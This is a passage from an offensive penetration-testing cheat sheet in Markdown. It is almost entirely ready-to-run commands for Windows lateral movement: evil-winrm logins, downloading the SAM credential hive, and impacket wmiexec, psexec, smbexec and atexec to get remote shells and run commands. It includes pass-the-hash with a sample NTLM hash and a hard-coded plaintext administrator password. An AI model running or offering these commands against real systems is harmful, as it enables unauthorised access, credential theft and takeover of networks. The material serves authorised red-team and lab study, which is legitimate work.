proxychains evil-winrm -i 172.16.yyy.yyy -u Administrator@hentai.com -p 'blu!BAHElSv01$'
```

- [ ] Using `evil-winrm` to download file from Target Machine
```bash
download sam
```

- [ ] Using `evil-winrm` to upload file to Target Machine
```bash
upload local_filename
```

## impacket
### wmiexec
- [ ] Get fully-interactive shell access from your Kali Machine
```bash
proxychains impacket-wmiexec hentaidomain/Administrator:'blu!BAHElSv01$'@172.16.yyy.yyy
```

- [ ] Get fully-interactive shell access by passing the NTLM Hash from your Kali Machine
```bash
impacket-wmiexec -hashes 00000000000000000000000000000000:e97a3a230ea655abed4f0027e762964b Administrator@192.168.yyy.yyy
```
### psexec
- [ ] Get fully-interactive shell access from your Kali Machine
```bash
proxychains impacket-psexec hentaidomain/Administrator:'blu!BAHElSv01$'@172.16.yyy.yyy
```

- [ ] Get fully-interactive shell access by passing the NTLM Hash from your Kali Machine
```
impacket-psexec -hashes 00000000000000000000000000000000:e97a3a230ea655abed4f0027e762964b Administrator@192.168.yyy.yyy
```
### smbexec
- [ ] Get semi-interactive shell from your Kali Machine
```bash
proxychains impacket-smbexec hentaidomain/Administrator:'blu!BAHElSv01$'@172.16.yyy.yyy
```
### atexec
- [ ] Get remote code execution from your Kali Machine
```bash
proxychains impacket-atexec hentaidomain/Administrator:'blu!BAHElSv01$'@172.16.yyy.yyy whoami
```